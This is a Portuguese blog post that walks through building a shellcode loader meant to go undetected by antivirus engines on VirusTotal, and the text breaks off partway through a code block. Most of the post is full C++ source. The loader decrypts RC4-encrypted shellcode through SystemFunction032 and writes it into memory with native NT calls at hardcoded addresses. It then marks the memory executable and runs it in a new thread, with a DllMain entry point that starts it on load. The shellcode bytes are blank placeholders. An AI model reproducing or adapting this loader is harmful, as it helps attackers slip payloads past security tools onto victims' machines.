<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="../images/50.png" type="image/x-icon">
    <title>Creating Loader</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/cpp.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            document.querySelectorAll('pre code').forEach((block) => {
                hljs.highlightElement(block);
            });
        });
    </script>
    <style>
        ::-webkit-scrollbar {
            width: 10px;
        }

        ::-webkit-scrollbar-track {
            background: #333;
        }

        ::-webkit-scrollbar-thumb {
            background: #555;
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #777;
        }

        html {
            scrollbar-color: #555 #333;
            scrollbar-width: thin;
        }
    </style>
    <style>
        pre {
            background-color: #1e1e1e;
            color: #ffffff;
            padding: 15px;
            border-radius: 8px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }
    </style>
    <link rel="stylesheet" href="../style.css">
    <link rel="stylesheet" href="../text_style.css">
    <link rel="stylesheet" href="../dimensao.css">
    <link rel="stylesheet" href="../background.css">
    <link rel="stylesheet" href="../head_style.css">
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
</head>

<body>
    <header style="height: 55px;">
        <div class="logo">
            <img src="../images/50.png" height="40" alt="Vith0r logo"
                style="position: relative; left: none; height: 42px; width: 42px; top: -1px;">
            <h2>
                <a href="https://vith0r.github.io"
                    style="color: rgba(255, 255, 255, 0.7); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(139, 92, 246, 0.7); font-family: 'Press Start 2P', sans-serif; font-size: 19px;">
                    &nbsp;VITHOR
                </a>
            </h2>
        </div>
        <nav>
            <div class="toggle-container">
                <a href="../whoami.html">
                    <button class="tutorials-toggle"><i></i>Whoami</button>
                </a>
                <a href="../posts.html">
                    <button class="tools-toggle"><i></i>Posts</button>
                </a>
                <a href="../projects.html">
                    <button class="tools-toggle"><i></i>Projects</button>
                </a>
            </div>
        </nav>
    </header>
    <script>
        const element = document.querySelector('.logo h2 a');
        const targetWord = "VITHOR";

        function getRandomString(length) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        function animateRandomization(element, targetWord) {
            const originalWord = targetWord.split('');
            let iterations = 0;
            const maxIterations = 15;
            let currentWord = getRandomString(targetWord.length).split('');
            let currentIndex = 0;

            element.style.display = 'inline-block';
            element.style.width = `${element.offsetWidth}px`;
            element.style.position = 'relative';
            element.style.left = '5px';

            const interval = setInterval(() => {
                if (iterations < maxIterations) {
                    currentWord = getRandomString(targetWord.length).split('');
                    iterations++;
                } else {
                    if (currentIndex < targetWord.length) {
                        currentWord[currentIndex] = originalWord[currentIndex];
                        currentIndex++;
                    } else {
                        clearInterval(interval);
                    }
                }
                element.textContent = currentWord.join('');
            }, 60);
        }

        setInterval(() => {
            animateRandomization(element, targetWord);
        }, 10000);

        element.addEventListener('mouseover', () => {
            animateRandomization(element, targetWord);
        });

        animateRandomization(element, targetWord);
    </script>

    <body>
        <div class="grain-header"></div>
        <main>
            <div class="box">
                <h1
                    style="color: rgba(255, 255, 255, 0.9); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(60, 122, 255, 0.8);">
                    Criando um Carregador</h1>
                <br>
                <p>Posted Jul 23, 2024. 10 min read</p>
                <br>
                <div class="post-author">
                    <a href="https://github.com/Vith0r" target="_blank">
                        <img src="https://avatars.githubusercontent.com/u/124220594?v=4" alt="Vithor logo">
                        <span>Vithor</span>
                    </a>
                </div>

                <article>
                    <div style="font-size: 16px;">
                        <p>Bom, acredito que um dos objetivos ao criar um malware é que seu arquivo não seja detectado,
                            por exemplo, no <span style="color: #9E2525;">VirusTotal</span>. No entanto, como esse
                            processo pode ser bastante complicado, muitas vezes é difícil alcançar essa meta. No post de
                            hoje, decidi criar um loader que não seja detectado por nenhum antivírus ao ser enviado para
                            o <span style="color: #9E2525;">VirusTotal</span>.</p>
                        <br>
                        <div
                            style="padding: 10px; background-color: rgba(60, 122, 255, 0.2); color: white; margin-bottom: 10px;">
                            ⚠️ As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou
                            qualquer outra coisa são estritamente para fins educacionais.
                        </div>
                        <br>
                        <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
                            Syscalls indiretas ou Diretas</h2>
                        <p>Syscalls podem ser chamadas de duas formas: <span style="color: #9E2525;">direta e
                                indireta</span>. As chamadas diretas acessam funções do kernel diretamente usando
                            números de syscall, enquanto as indiretas utilizam funções intermediárias para realizar as
                            chamadas.<br> Abaixo deixei 2 exemplos para melhor entendimento:</p>
                        <br>
                        <p><img src="https://telegra.ph/file/db264b99dda666532b98d.png" alt="SyscallsDiretos"
                                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;">
                        </p>
                        <p><img src="https://telegra.ph/file/4d8fb25cc244a8274caaa.png" alt="Sfx"
                                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;">
                        </p>
                        <br>
                        <p>Mas vamos fazer isso de uma maneira diferente. Vocês vão ver ao longo do post e entender do
                            que estou falando.</p>
                        <br>
                        <pre
                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>

<span class="hljs-comment">// Definições necessárias para a API não documentada do Windows</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_CLIENT_ID</span> {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_UNICODE_STRING</span> {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_OBJECT_ATTRIBUTES</span> {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

<span class="hljs-meta">#<span class="hljs-keyword">define</span> InitializeObjectAttributes(p, n, a, r, s) { \
    (p)-&gt;Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)-&gt;RootDirectory = r;                         \
    (p)-&gt;Attributes = a;                            \
    (p)-&gt;ObjectName = n;                            \
    (p)-&gt;SecurityDescriptor = s;                    \
    (p)-&gt;SecurityQualityOfService = NULL;           \
}</span>

<span class="hljs-comment">// Definição dos ponteiros de função</span>
<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtOpenProcess_t)</span><span class="hljs-params">(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
    )</span></span>;

<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtAllocateVirtualMemory_t)</span><span class="hljs-params">(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    )</span></span>;

<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtWriteVirtualMemory_t)</span><span class="hljs-params">(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
    )</span></span>;

<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtProtectVirtualMemory_t)</span><span class="hljs-params">(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    )</span></span>;

<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtCreateThreadEx_t)</span><span class="hljs-params">(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    )</span></span>;

<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtWaitForSingleObject_t)</span><span class="hljs-params">(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
    )</span></span>;

<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtFreeVirtualMemory_t)</span><span class="hljs-params">(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    )</span></span>;

<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtClose_t)</span><span class="hljs-params">(
    HANDLE Handle
    )</span></span>;

<span class="hljs-comment">// Endereços</span>
<span class="hljs-keyword">constexpr</span> <span class="hljs-type">uintptr_t</span> addr_NtOpenProcess = <span class="hljs-number">0x00007FFC4962DA10</span>;
<span class="hljs-keyword">constexpr</span> <span class="hljs-type">uintptr_t</span> addr_NtAllocateVirtualMemory = <span class="hljs-number">0x00007FFC4962D850</span>;
<span class="hljs-keyword">constexpr</span> <span class="hljs-type">uintptr_t</span> addr_NtWriteVirtualMemory = <span class="hljs-number">0x00007FFC4962DC90</span>;
<span class="hljs-keyword">constexpr</span> <span class="hljs-type">uintptr_t</span> addr_NtProtectVirtualMemory = <span class="hljs-number">0x00007FFC4962DF50</span>;
<span class="hljs-keyword">constexpr</span> <span class="hljs-type">uintptr_t</span> addr_NtCreateThreadEx = <span class="hljs-number">0x00007FFC4962ED80</span>;
<span class="hljs-keyword">constexpr</span> <span class="hljs-type">uintptr_t</span> addr_NtWaitForSingleObject = <span class="hljs-number">0x00007FFC4962D5D0</span>;
<span class="hljs-keyword">constexpr</span> <span class="hljs-type">uintptr_t</span> addr_NtFreeVirtualMemory = <span class="hljs-number">0x00007FFC4962D910</span>;
<span class="hljs-keyword">constexpr</span> <span class="hljs-type">uintptr_t</span> addr_NtClose = <span class="hljs-number">0x00007FFC4962D730</span>;

<span class="hljs-comment">// Convertendo endereços para funções</span>
NtOpenProcess_t NtOpenProcess = <span class="hljs-built_in">reinterpret_cast</span>&lt;NtOpenProcess_t&gt;(addr_NtOpenProcess);
NtAllocateVirtualMemory_t NtAllocateVirtualMemory = <span class="hljs-built_in">reinterpret_cast</span>&lt;NtAllocateVirtualMemory_t&gt;(addr_NtAllocateVirtualMemory);
NtWriteVirtualMemory_t NtWriteVirtualMemory = <span class="hljs-built_in">reinterpret_cast</span>&lt;NtWriteVirtualMemory_t&gt;(addr_NtWriteVirtualMemory);
NtProtectVirtualMemory_t NtProtectVirtualMemory = <span class="hljs-built_in">reinterpret_cast</span>&lt;NtProtectVirtualMemory_t&gt;(addr_NtProtectVirtualMemory);
NtCreateThreadEx_t NtCreateThreadEx = <span class="hljs-built_in">reinterpret_cast</span>&lt;NtCreateThreadEx_t&gt;(addr_NtCreateThreadEx);
NtWaitForSingleObject_t NtWaitForSingleObject = <span class="hljs-built_in">reinterpret_cast</span>&lt;NtWaitForSingleObject_t&gt;(addr_NtWaitForSingleObject);
NtFreeVirtualMemory_t NtFreeVirtualMemory = <span class="hljs-built_in">reinterpret_cast</span>&lt;NtFreeVirtualMemory_t&gt;(addr_NtFreeVirtualMemory);
NtClose_t NtClose = <span class="hljs-built_in">reinterpret_cast</span>&lt;NtClose_t&gt;(addr_NtClose);

<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_USTRING</span> {
    ULONG Length;
    ULONG MaximumLength;
    PWSTR Buffer;
} USTRING;

<span class="hljs-keyword">typedef</span> LONG NTSTATUS;

<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* fnSystemFunction032)</span><span class="hljs-params">(
    USTRING* Img,
    USTRING* Key
    )</span></span>;

<span class="hljs-function">BOOL <span class="hljs-title">RC4DEC</span><span class="hljs-params">(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize)</span> </span>{
    NTSTATUS STATUS;
    USTRING Key = { dwRc4KeySize, dwRc4KeySize, <span class="hljs-built_in">reinterpret_cast</span>&lt;PWSTR&gt;(pRc4Key) };
    USTRING Img = { sPayloadSize, sPayloadSize, <span class="hljs-built_in">reinterpret_cast</span>&lt;PWSTR&gt;(pPayloadData) };
    <span class="hljs-type">char</span> a_dll_name[] = <span class="hljs-string">&quot;Advapi32.dll&quot;</span>;
    <span class="hljs-type">char</span> NotSysFunc32[] = <span class="hljs-string">&quot;SystemFunction032&quot;</span>;
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">LoadLibraryA</span>(a_dll_name), NotSysFunc32);

    STATUS = <span class="hljs-built_in">SystemFunction032</span>(&amp;Img, &amp;Key);
    <span class="hljs-keyword">if</span> (STATUS != <span class="hljs-number">0x0</span>) {
        <span class="hljs-keyword">return</span> FALSE;
    }
    <span class="hljs-keyword">return</span> TRUE;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    HANDLE processHandle;
    CLIENT_ID clientId;
    clientId.UniqueProcess = <span class="hljs-built_in">reinterpret_cast</span>&lt;HANDLE&gt;(<span class="hljs-built_in">GetCurrentProcessId</span>());
    clientId.UniqueThread = <span class="hljs-number">0</span>;

    OBJECT_ATTRIBUTES objAttr;
    <span class="hljs-built_in">InitializeObjectAttributes</span>(&amp;objAttr, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);

    NTSTATUS status = <span class="hljs-built_in">NtOpenProcess</span>(&amp;processHandle, PROCESS_ALL_ACCESS, &amp;objAttr, &amp;clientId);
    <span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) {
        std::cerr &lt;&lt; <span class="hljs-string">&quot;NtOpenProcess failed: &quot;</span> &lt;&lt; std::hex &lt;&lt; status &lt;&lt; std::endl;
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }

    PVOID baseAddress = <span class="hljs-literal">NULL</span>;
    SIZE_T regionSize = <span class="hljs-number">1</span>;
    status = <span class="hljs-built_in">NtAllocateVirtualMemory</span>(processHandle, &amp;baseAddress, <span class="hljs-number">0</span>, &amp;regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    <span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) {
        std::cerr &lt;&lt; <span class="hljs-string">&quot;NtAllocateVirtualMemory failed: &quot;</span> &lt;&lt; std::hex &lt;&lt; status &lt;&lt; std::endl;
        <span class="hljs-built_in">NtClose</span>(processHandle);
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }

    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = {
    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>

    };

    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Key[] = {
    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>
    };



	DWORD SIZEKEY = <span class="hljs-built_in">sizeof</span>(Key);
    DWORD SIZEPAY = <span class="hljs-built_in">sizeof</span>(shellcode);

    SIZE_T writtenBytes = <span class="hljs-number">0</span>;
    status = <span class="hljs-built_in">NtWriteVirtualMemory</span>(processHandle, baseAddress, shellcode, <span class="hljs-built_in">sizeof</span>(shellcode), &amp;writtenBytes);
    <span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) {
        std::cerr &lt;&lt; <span class="hljs-string">&quot;NtWriteVirtualMemory failed: &quot;</span> &lt;&lt; std::hex &lt;&lt; status &lt;&lt; std::endl;
        <span class="hljs-built_in">NtFreeVirtualMemory</span>(processHandle, &amp;baseAddress, &amp;regionSize, MEM_RELEASE);
        <span class="hljs-built_in">NtClose</span>(processHandle);
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }

	BOOL DECRYPT = <span class="hljs-built_in">RC4DEC</span>(Key, <span class="hljs-built_in">static_cast</span>&lt;PBYTE&gt;(baseAddress), SIZEKEY, SIZEPAY);

    ULONG oldProtect = <span class="hljs-number">0</span>;
    status = <span class="hljs-built_in">NtProtectVirtualMemory</span>(processHandle, &amp;baseAddress, &amp;regionSize, PAGE_EXECUTE_READ, &amp;oldProtect);
    <span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) {
        std::cerr &lt;&lt; <span class="hljs-string">&quot;NtProtectVirtualMemory failed: &quot;</span> &lt;&lt; std::hex &lt;&lt; status &lt;&lt; std::endl;
        <span class="hljs-built_in">NtFreeVirtualMemory</span>(processHandle, &amp;baseAddress, &amp;regionSize, MEM_RELEASE);
        <span class="hljs-built_in">NtClose</span>(processHandle);
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }

    HANDLE threadHandle;
    status = <span class="hljs-built_in">NtCreateThreadEx</span>(&amp;threadHandle, THREAD_ALL_ACCESS, <span class="hljs-literal">NULL</span>, processHandle, baseAddress, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) {
        std::cerr &lt;&lt; <span class="hljs-string">&quot;NtCreateThreadEx failed: &quot;</span> &lt;&lt; std::hex &lt;&lt; status &lt;&lt; std::endl;
        <span class="hljs-built_in">NtFreeVirtualMemory</span>(processHandle, &amp;baseAddress, &amp;regionSize, MEM_RELEASE);
        <span class="hljs-built_in">NtClose</span>(processHandle);
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }

    status = <span class="hljs-built_in">NtWaitForSingleObject</span>(threadHandle, FALSE, <span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) {
        std::cerr &lt;&lt; <span class="hljs-string">&quot;NtWaitForSingleObject failed: &quot;</span> &lt;&lt; std::hex &lt;&lt; status &lt;&lt; std::endl;
    }

    <span class="hljs-built_in">NtClose</span>(threadHandle);
    <span class="hljs-built_in">NtFreeVirtualMemory</span>(processHandle, &amp;baseAddress, &amp;regionSize, MEM_RELEASE);
    <span class="hljs-built_in">NtClose</span>(processHandle);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WINDLL</span>

<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">bool</span> __stdcall <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE H_instance, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsn)</span> </span>{

    <span class="hljs-built_in">DisableThreadLibraryCalls</span>(H_instance);
    <span class="hljs-keyword">switch</span> (rsn)
    {
    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:
    {
        <span class="hljs-built_in">CreateThread</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)main, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    } <span class="hljs-keyword">break</span>;

    }

    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>

</pre>
                        <br>
                        <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
                            Explicando brevemente algumas partes do código:</h2>
                        <p>Começamos definindo várias estruturas necessárias para interagir com as APIs não documentadas
                            do Windows, como <span style="color: #9E2525;">CLIENT_ID</span>, <span
                                style="color: #9E2525;">UNICODE_STRING</span> e <span
                                style="color: #9E2525;">OBJECT_ATTRIBUTES</span>.</p>
                        <br>
                        <pre
                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">
<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_CLIENT_ID</span> {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_UNICODE_STRING</span> {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_OBJECT_ATTRIBUTES</span> {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

<span class="hljs-meta">#<span class="hljs-keyword">define</span> InitializeObjectAttributes(p, n, a, r, s) { \
    (p)-&gt;Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)-&gt;RootDirectory = r;                         \
    (p)-&gt;Attributes = a;                            \
    (p)-&gt;ObjectName = n;                            \
    (p)-&gt;SecurityDescriptor = s;                    \
    (p)-&gt;SecurityQualityOfService = NULL;           \
}</span>

</pre>
                        <br>
                        <p>Depois definimos os tipos de função para cada api que será usada no código.</p>
                        <br>
                        <pre
                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtOpenProcess_t)</span><span class="hljs-params">(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
    )</span></span>;
<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtAllocateVirtualMemory_t)</span><span class="hljs-params">(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    )</span></span>;
<span class="hljs-comment">// Definições semelhantes para NtWriteVirtualMemory, NtProtectVirtualMemory, etc.</span>

</pre>
                        <br>
                        <p>Depois definimos os endereços das APIs como constantes:</p>
                        <br>
                        <pre
                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">
<span class="hljs-keyword">constexpr</span> <span class="hljs-type">uintptr_t</span> addr_NtOpenProcess = <span class="hljs-number">0x00007FFC4962DA10</span>;
<span class="hljs-comment">// Definições semelhantes para outras APIs...</span>
}
</pre>
                        <br>
                        <p>Depois os endereços serão convertidos para ponteiros de função.</p>
                        <br>
                        <pre
                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">NtOpenProcess_t NtOpenProcess = <span class="hljs-built_in">reinterpret_cast</span>&lt;NtOpenProcess_t&gt;(addr_NtOpenProcess);
<span class="hljs-comment">// Conversões semelhantes para outras APIs...</span>
</pre>
                        <br>
                        <p>Então para não fornecer o shellcode puro no código criptografamos a nossa shellcode com RC4
                            usamos a boa e velha Função de Decriptação RC4:</p>
                        <br>
                        <pre
                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-function">BOOL <span class="hljs-title">RC4DEC</span><span class="hljs-params">(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize)</span> </span>{
    NTSTATUS STATUS;
    USTRING Key = { dwRc4KeySize, dwRc4KeySize, <span class="hljs-built_in">reinterpret_cast</span>&lt;PWSTR&gt;(pRc4Key) };
    USTRING Img = { sPayloadSize, sPayloadSize, <span class="hljs-built_in">reinterpret_cast</span>&lt;PWSTR&gt;(pPayloadData) };
    <span class="hljs-type">char</span> a_dll_name[] = <span class="hljs-string">&quot;Advapi32.dll&quot;</span>;
    <span class="hljs-type">char</span> NotSysFunc32[] = <span class="hljs-string">&quot;SystemFunction032&quot;</span>;
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">LoadLibraryA</span>(a_dll_name), NotSysFunc32);

    STATUS = <span class="hljs-built_in">SystemFunction032</span>(&amp;Img, &amp;Key);
    <span class="hljs-keyword">if</span> (STATUS != <span class="hljs-number">0x0</span>) {
        <span class="hljs-keyword">return</span> FALSE;
    }
    <span class="hljs-keyword">return</span> TRUE;
}
</pre>
                        <br>
                        <p>E a nossa função <span style="color: #9E2525;">main</span> faz o classico ela Abre o processo
                            atual usando <span style="color: #9E2525;">NtOpenProcess</span>, Aloca memória no processo
                            com <span style="color: #9E2525;">NtAllocateVirtualMemory</span>, Escreve o shellcode
                            criptografado na memória alocada com <span
                                style="color: #9E2525;">NtWriteVirtualMemory</span> e descriptografa usando o <span
                                style="color: #9E2525;">RC4DEC</span>, Então protege a memória para execução com <span
                                style="color: #9E2525;">NtProtectVirtualMemory</span>, Cria um thread para executar o
                            shellcode usando <span style="color: #9E2525;">NtCreateThreadEx</span>, Espera pelo término
                            do thread com <span style="color: #9E2525;">NtWaitForSingleObject</span>, Libera a memória
                            alocada com <span style="color: #9E2525;">NtFreeVirtualMemory</span>, Fecha o handle do
                            processo com <span style="color: #9E2525;">NtClose</span>.</p>
                        <br>
                        <pre
                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    HANDLE processHandle;
    CLIENT_ID clientId;
    clientId.UniqueProcess = <span class="hljs-built_in">reinterpret_cast</span>&lt;HANDLE&gt;(<span class="hljs-built_in">GetCurrentProcessId</span>());
    clientId.UniqueThread = <span class="hljs-number">0</span>;

    OBJECT_ATTRIBUTES objAttr;
    <span class="hljs-built_in">InitializeObjectAttributes</span>(&amp;objAttr, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);

    NTSTATUS status = <span class="hljs-built_in">NtOpenProcess</span>(&amp;processHandle, PROCESS_ALL_ACCESS, &amp;objAttr, &amp;clientId);
    <span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) {
        std::cerr &lt;&lt; <span class="hljs-string">&quot;NtOpenProcess failed: &quot;</span> &lt;&lt; std::hex &lt;&lt; status &lt;&lt; std::endl;
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }

    PVOID baseAddress = <span class="hljs-literal">NULL</span>;
    SIZE_T regionSize = <span class="hljs-number">1</span>;
    status = <span class="hljs-built_in">NtAllocateVirtualMemory</span>(processHandle, &amp;baseAddress, <span class="hljs-number">0</span>, &amp;regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    <span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) {
        std::cerr &lt;&lt; <span class="hljs-string">&quot;NtAllocateVirtualMemory failed: &quot;</span> &lt;&lt; std::hex &lt;&lt; status &lt;&lt; std::endl;
        <span class="hljs-built_in">NtClose</span>(processHandle);
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }

}
</pre>
                        <br>
                        <p>Depois, por fim, declaramos uma exportação que cria uma thread para nossa <span
                                style="color: #9E2525;">main</span>.</p>
                        <br>
                        <pre
                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WINDLL</span>

